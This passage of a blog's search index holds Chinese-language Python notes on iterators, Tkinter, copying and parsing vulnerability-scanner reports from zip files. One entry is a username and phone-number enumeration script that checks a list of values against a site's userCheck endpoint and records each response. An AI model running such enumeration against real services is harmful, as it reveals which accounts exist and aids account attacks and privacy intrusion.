class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterator</span><br><span class="line">&gt;&gt;&gt; isinstance((x for x in range(10)), Iterator)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance([], Iterator)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><h6 id="iter-函数"><a href="#iter-函数" class="headerlink" title="iter()函数"></a>iter()函数</h6><p>生成器都是 Iterator 对象，但 list 、 dict 、 str 虽然是 Iterable ，却不是 Iterator 。</p><p>把 list 、 dict 、 str 等 Iterable 变成 Iterator 可以使用 iter() 函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from collections import Iterator</span><br><span class="line">&gt;&gt;&gt; isinstance(iter([]), Iterator)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>凡是可作用于 for 循环的对象都是 Iterable 类型；<br>凡是可作用于 next() 函数的对象都是 Iterator 类型<br>集合数据类型如 list 、 dict 、 str 等是 Iterable 但不是 Iterator ，不过可以通过 iter() 函数获得一个 Iterator 对象</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 用户名穷举</title>
      <link href="/article/refuse-tel.html"/>
      <url>/article/refuse-tel.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">with open(&quot;name.txt&quot;) as lists:</span><br><span class="line">  for uname in lists:</span><br><span class="line">    uname = uname.strip()</span><br><span class="line">    url = &apos;http://webing.io/userCheck?data=&#123;&quot;telephone&quot;:&quot;%s&quot;&#125;&apos; % uname</span><br><span class="line">    html = urllib.request.urlopen(url)</span><br><span class="line">    #Python3 中文乱码用到</span><br><span class="line">    content = html.read().decode(encoding=&quot;utf-8&quot;, errors=&quot;strict&quot;)</span><br><span class="line">    html.close()</span><br><span class="line">    messages = re.findall(r&apos;&quot;message&quot;:&quot;(.*?)&quot;,&apos;, content)</span><br><span class="line">    for message in messages:</span><br><span class="line">      print(uname + &apos; : &apos; + message)</span><br><span class="line">      with open(&apos;message.txt&apos;,&apos;a&apos;) as mess:</span><br><span class="line">        mess.write(uname + &apos; : &apos; + message)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 回收站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python TKinter</title>
      <link href="/article/python-tkinter.html"/>
      <url>/article/python-tkinter.html</url>
      
        <content type="html"><![CDATA[<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from tkinter import*  </span><br><span class="line">  </span><br><span class="line">#初始化Tk()  </span><br><span class="line">myWindow = Tk()  </span><br><span class="line">#设置标题  </span><br><span class="line">myWindow.title(&apos;Python GUI Learning&apos;)  </span><br><span class="line">   </span><br><span class="line"># 用来获取复选框是否被勾选，通过chVarDis.get()来获取其的状态,其状态值为int类型 勾选为1  未勾选为0  </span><br><span class="line">chVarDis = IntVar()  </span><br><span class="line"># text为该复选框后面显示的名称, variable将该复选框的状态赋值给一个变量，当state=&apos;disabled&apos;时，该复选框为灰色，不能点的状态  </span><br><span class="line">check1 = Checkbutton(myWindow, text=&quot;Disabled&quot;, variable=chVarDis, state=&apos;disabled&apos;)     </span><br><span class="line"># 该复选框是否勾选,select为勾选, deselect为不勾选  </span><br><span class="line">check1.select()      </span><br><span class="line"># sticky=tk.W  当该列中其他行或该行中的其他列的某一个功能拉长这列的宽度或高度时，  </span><br><span class="line"># 设定该值可以保证本行保持左对齐，N：北/上对齐  S：南/下对齐  W：西/左对齐  E：东/右对齐  </span><br><span class="line">check1.grid(column=0, row=0, sticky=W)       </span><br><span class="line">  </span><br><span class="line">chvarUn = IntVar()  </span><br><span class="line">check2 = Checkbutton(myWindow, text=&quot;UnChecked&quot;, variable=chvarUn)  </span><br><span class="line">check2.deselect()  </span><br><span class="line">check2.grid(column=1, row=0, sticky=W)  </span><br><span class="line">  </span><br><span class="line">chvarEn = IntVar()  </span><br><span class="line">check3 = Checkbutton(myWindow, text=&quot;Enabled&quot;, variable=chvarEn)  </span><br><span class="line">check3.select()  </span><br><span class="line">check3.grid(column=2, row=0, sticky=W)  </span><br><span class="line">  </span><br><span class="line">#进入消息循环  </span><br><span class="line">myWindow.mainloop()</span><br></pre></td></tr></table></figure><h3 id="一个简陋的界面"><a href="#一个简陋的界面" class="headerlink" title="一个简陋的界面"></a>一个简陋的界面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">from tkinter import *</span><br><span class="line">from tkinter.filedialog import askdirectory</span><br><span class="line"></span><br><span class="line">LOG_LINE_NUM = 0</span><br><span class="line"></span><br><span class="line">class RSAS_GUI():</span><br><span class="line">    def __init__(self,init_window_name):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line">        self.init_window_name.geometry(&apos;650x350+600+250&apos;)</span><br><span class="line">        self.start_path = StringVar()</span><br><span class="line">        self.end_path = StringVar()</span><br><span class="line"></span><br><span class="line">    def startPath(self):</span><br><span class="line">        self.path_start = askdirectory()</span><br><span class="line">        self.start_path.set(self.path_start)</span><br><span class="line"></span><br><span class="line">    def endPath(self):</span><br><span class="line">        self.path_end = askdirectory()</span><br><span class="line">        self.end_path.set(self.path_end)</span><br><span class="line"></span><br><span class="line">    #设置窗口</span><br><span class="line">    def set_init_window(self):</span><br><span class="line">        self.init_window_name.title(&apos;RSAS漏洞跟踪表导出工具1.0&apos;)</span><br><span class="line">        self.init_window_name.geometry(&apos;650x350+600+250&apos;)</span><br><span class="line">        #标签</span><br><span class="line">        self.init_data_label = Label(self.init_window_name,text = &quot;原始报告路径:&quot;)</span><br><span class="line">        self.init_data_label.grid(row = 0, column = 0)</span><br><span class="line">        self.init_data_entry = Entry(self.init_window_name, textvariable = self.start_path, width=65)</span><br><span class="line">        self.init_data_entry.grid(row = 0, column = 1)</span><br><span class="line">        self.init_data_button = Button(self.init_window_name, text = &quot;打开文件夹&quot;, command = self.startPath)</span><br><span class="line">        self.init_data_button.grid(row = 0, column = 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.result_data_label = Label(self.init_window_name,text = &quot;输出报告路径:&quot;)</span><br><span class="line">        self.result_data_label.grid(row = 1, column = 0)</span><br><span class="line">        self.result_data_entry = Entry(self.init_window_name, textvariable = self.end_path, width=65)</span><br><span class="line">        self.result_data_entry.grid(row = 1, column = 1)</span><br><span class="line">        self.result_data_button = Button(self.init_window_name, text = &quot;打开文件夹&quot;, command = self.endPath)</span><br><span class="line">        self.result_data_button.grid(row = 1, column = 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.log_label = Label(self.init_window_name, text=&quot;输出日志：&quot;)</span><br><span class="line">        self.log_label.grid(row=2, column=0)</span><br><span class="line">        self.log_label = Text(self.init_window_name, width=92, height=20)</span><br><span class="line">        self.log_label.grid(row=13, column=0, columnspan=10)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">        #按钮</span><br><span class="line">        self.export_log = Button(self.init_window_name, text=&quot;开始输出&quot;, width=9,command=self.main)</span><br><span class="line">        self.export_log.grid(row=2, column=2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #功能函数</span><br><span class="line">    def main(self):</span><br><span class="line">        for x in range(1,10):</span><br><span class="line">            self.write_log_to_Text(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #获取当前时间</span><br><span class="line">    def get_current_time(self):</span><br><span class="line">        current_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))</span><br><span class="line">        return current_time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #日志动态打印</span><br><span class="line">    def write_log_to_Text(self,logmsg):</span><br><span class="line">        global LOG_LINE_NUM</span><br><span class="line">        current_time = self.get_current_time()</span><br><span class="line">        logmsg_in = str(current_time) +&quot; &quot; + str(logmsg) + &quot;\n&quot;</span><br><span class="line">        if LOG_LINE_NUM &lt;= 18:</span><br><span class="line">            self.log_label.insert(END, logmsg_in)</span><br><span class="line">            LOG_LINE_NUM = LOG_LINE_NUM + 1</span><br><span class="line">        else:</span><br><span class="line">            self.log_label.delete(1.0,2.0)</span><br><span class="line">            self.log_label.insert(END, logmsg_in)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gui_start():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ZMJ_PORTAL = RSAS_GUI(init_window)</span><br><span class="line">    ZMJ_PORTAL.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gui_start()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from tkinter import *</span><br><span class="line">from tkinter.filedialog import askdirectory</span><br><span class="line"></span><br><span class="line">def startPath():</span><br><span class="line">    path_start = askdirectory()</span><br><span class="line">    start_path.set(path_start)</span><br><span class="line"></span><br><span class="line">def endPath():</span><br><span class="line">    path_end = askdirectory()</span><br><span class="line">    end_path.set(path_end)</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(&apos;RSAS漏洞跟踪表导出工具1.0&apos;)</span><br><span class="line">root.geometry(&apos;650x350+600+250&apos;)</span><br><span class="line">start_path = StringVar()</span><br><span class="line">end_path = StringVar()</span><br><span class="line"></span><br><span class="line">Label(root,text = &quot;原始报告路径:&quot;).grid(row = 0, column = 0)</span><br><span class="line">Entry(root, textvariable = start_path, width=65).grid(row = 0, column = 1)</span><br><span class="line">Button(root, text = &quot;打开文件夹&quot;, command = startPath).grid(row = 0, column = 2)</span><br><span class="line"></span><br><span class="line">Label(root,text = &quot;输出报告路径:&quot;).grid(row = 1, column = 0)</span><br><span class="line">Entry(root, textvariable = end_path, width=65).grid(row = 1, column = 1)</span><br><span class="line">Button(root, text = &quot;打开文件夹&quot;, command = endPath).grid(row = 1, column = 2)</span><br><span class="line"></span><br><span class="line">Label(root, text=&quot;输出日志：&quot;).grid(row=2, column=1)</span><br><span class="line">Text(root, width=92, height=20).grid(row=13, column=0, columnspan=10)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 模块导入、深拷贝、浅拷贝、私有化</title>
      <link href="/article/python-import-module.html"/>
      <url>/article/python-import-module.html</url>
      
        <content type="html"><![CDATA[<h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path</span><br><span class="line">#使用绝对路径的模块</span><br><span class="line">sys.path.append(&apos;../test&apos;)</span><br></pre></td></tr></table></figure><h3 id="重新导入模块"><a href="#重新导入模块" class="headerlink" title="重新导入模块"></a>重新导入模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import imp</span><br><span class="line">#重新导入模块，程序运行时，模块内容改变的情况下使用</span><br><span class="line">imp.reload(test)</span><br></pre></td></tr></table></figure><h3 id="、-is"><a href="#、-is" class="headerlink" title="== 、 is"></a>== 、 is</h3><p>== 判断两个值是否相等<br>is 判断两个值是否指向同一个对象</p><h3 id="深拷贝、浅拷贝"><a href="#深拷贝、浅拷贝" class="headerlink" title="深拷贝、浅拷贝"></a>深拷贝、浅拷贝</h3><p>浅拷贝:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line">b = a</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">139931302080072</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">139931302080072</span><br><span class="line">#指向另一个对象就是浅拷贝，属于地址的拷贝</span><br></pre></td></tr></table></figure><p>深拷贝:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import copy</span><br><span class="line">a = [1,2,3]</span><br><span class="line">b = copy.deepcopy(a)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">140338258789000</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">140338258677128</span><br><span class="line"></span><br><span class="line">a.append(4)</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">[1, 2, 3]</span><br><span class="line">#只拷贝一次</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import copy</span><br><span class="line">a = [1,2,3]</span><br><span class="line">b = copy.copy(a)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; id(a)</span><br><span class="line">140338258789000</span><br><span class="line">&gt;&gt;&gt; id(b)</span><br><span class="line">140338258677128</span><br><span class="line"></span><br><span class="line">a.append(4)</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">[1, 2, 3, 4]</span><br><span class="line">#如果拷贝的源文件有变化，就会继续拷贝，元祖是不可变类型，拷贝不可变类型相当于浅拷贝</span><br></pre></td></tr></table></figure><h3 id="私有化"><a href="#私有化" class="headerlink" title="私有化"></a>私有化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 获取目录下的指定文件名</title>
      <link href="/article/python-input-folder-name.html"/>
      <url>/article/python-input-folder-name.html</url>
      
        <content type="html"><![CDATA[<p>参考：<br>Python 获取目录下的指定文件名<br><a href="https://webing.io/article/computer-python-input-folder-name.html" target="_blank" rel="noopener">https://webing.io/article/computer-python-input-folder-name.html</a><br>Python zipfile无需解压直接读取zip中的文件内容<br><a href="https://webing.io/article/computer-python-zipfile.html" target="_blank" rel="noopener">https://webing.io/article/computer-python-zipfile.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line">import html</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class File_re(object):</span><br><span class="line">    &quot;&quot;&quot;docstring for File_re&quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(File_re, self).__init__()</span><br><span class="line">        # 正则，获取指定文件名</span><br><span class="line">        self.file_re = &apos;.*?.zip&apos;</span><br><span class="line">        # 正则，用于zip文件内有效</span><br><span class="line">        self.uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 等参，等待传入目录路径</span><br><span class="line">    folder_name = str(sys.argv[1])</span><br><span class="line">    # 获取指定路径的所有文件名</span><br><span class="line">    dirList = os.listdir(folder_name)</span><br><span class="line">    print(&apos;正在提取数据，请稍后！&apos;)</span><br><span class="line">    # 遍历输出所有文件名</span><br><span class="line">    for name in dirList:</span><br><span class="line">        # 只获取正则内的文件名</span><br><span class="line">        all_file_name = re.findall(File_re().file_re,name)</span><br><span class="line">        for file_name in all_file_name:</span><br><span class="line">            print(&apos;正在提取 %s&apos;%file_name)</span><br><span class="line">            # print(&apos;&lt;python id=&quot;custom&quot;&gt;&apos;+file_name+&apos;&lt;/python&gt;&apos;)</span><br><span class="line">            # 打开压缩文件</span><br><span class="line">            uzip = zipfile.ZipFile(folder_name+&apos;/&apos;+file_name)</span><br><span class="line">            # 迭代所有文件名</span><br><span class="line">            for uzip_content in uzip.namelist():</span><br><span class="line">                # 只获取正则内的文件名</span><br><span class="line">                all_uzip_content = re.findall(File_re().uzip_re,uzip_content)</span><br><span class="line">                for all_uzip in all_uzip_content:</span><br><span class="line">                    # 打开这个文件</span><br><span class="line">                    htmlcont = uzip.open(all_uzip).read().decode(&apos;utf8&apos;)</span><br><span class="line">                    # print(html.unescape(htmlcont))</span><br><span class="line">                    with open(&apos;rsascache&apos;, &apos;a&apos;) as f:</span><br><span class="line">                        f.write(&apos;&lt;python id=&quot;custom&quot;&gt;&apos;+file_name+&apos;&lt;/python&gt;&apos;)</span><br><span class="line">                        f.write(html.unescape(htmlcont))</span><br><span class="line">            print(&apos;提取 %s&apos;%file_name+&apos; 完成！&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class File_re(object):</span><br><span class="line">    &quot;&quot;&quot;docstring for File_re&quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(File_re, self).__init__()</span><br><span class="line">        # 正则，获取指定文件名</span><br><span class="line">        self.file_re = &apos;.*?.zip&apos;</span><br><span class="line">        # 正则，用于zip文件内有效</span><br><span class="line">        self.uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 等参，等待传入目录路径</span><br><span class="line">    folder_name = str(sys.argv[1])</span><br><span class="line">    # 获取指定路径的所有文件名</span><br><span class="line">    dirList = os.listdir(folder_name)</span><br><span class="line">    # 遍历输出所有文件名</span><br><span class="line">    for name in dirList:</span><br><span class="line">        # 只获取正则内的文件名</span><br><span class="line">        all_file_name = re.findall(File_re().file_re,name)</span><br><span class="line">        for file_name in all_file_name:</span><br><span class="line">                # 打开压缩文件</span><br><span class="line">                uzip = zipfile.ZipFile(file_name)</span><br><span class="line">                # 迭代所有文件名</span><br><span class="line">                for uzip_content in uzip.namelist():</span><br><span class="line">                    # 只获取正则内的文件名</span><br><span class="line">                    all_uzip_content = re.findall(File_re().uzip_re,uzip_content)</span><br><span class="line">                    for all_uzip in all_uzip_content:</span><br><span class="line">                        # 打开这个文件</span><br><span class="line">                        htmlcont = uzip.open(all_uzip).read().decode(&apos;utf8&apos;)</span><br><span class="line">                        print(htmlcont)</span><br><span class="line">                        time.sleep(5)</span><br><span class="line"></span><br><span class="line">                print(uzip.filename)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line">uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"></span><br><span class="line">for name in os.listdir(str(sys.argv[1])):</span><br><span class="line">    if re.findall(file_re,name):</span><br><span class="line">        for uzip_content in zipfile.ZipFile(re.findall(file_re,name)[0]).namelist():</span><br><span class="line">            if re.findall(uzip_re,uzip_content):</span><br><span class="line">                htmlcont = zipfile.ZipFile(re.findall(file_re,name)[0]).open(re.findall(uzip_re,uzip_content)[0]).read().decode(&apos;utf8&apos;)</span><br><span class="line">                print(htmlcont)</span><br><span class="line"></span><br><span class="line">        print(zipfile.ZipFile(re.findall(file_re,name)[0]).filename)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line"># 正则，获取指定文件名</span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line"># 正则，用于zip文件内有效</span><br><span class="line">uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"># 等参，等待传入目录路径</span><br><span class="line">folder_name = str(sys.argv[1])</span><br><span class="line"></span><br><span class="line"># 获取指定路径的所有文件名</span><br><span class="line">dirList = os.listdir(folder_name)</span><br><span class="line"></span><br><span class="line"># 遍历输出所有文件名</span><br><span class="line">for name in dirList:</span><br><span class="line">    # 只获取正则内的文件名</span><br><span class="line">    all_file_name = re.findall(file_re,name)</span><br><span class="line">    # 如果文件名不为空</span><br><span class="line">    if all_file_name:</span><br><span class="line">        # 打开压缩文件</span><br><span class="line">        uzip = zipfile.ZipFile(all_file_name[0])</span><br><span class="line">        # 迭代所有文件名</span><br><span class="line">        for uzip_content in uzip.namelist():</span><br><span class="line">            # 只获取正则内的文件名</span><br><span class="line">            all_uzip_content = re.findall(uzip_re,uzip_content)</span><br><span class="line">            # 如果文件名不为空</span><br><span class="line">            if all_uzip_content:</span><br><span class="line">                # 打开这个文件</span><br><span class="line">                htmlcont = uzip.open(all_uzip_content[0]).read().decode(&apos;utf8&apos;)</span><br><span class="line">                print(htmlcont)</span><br><span class="line"></span><br><span class="line">        print(uzip.filename)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span 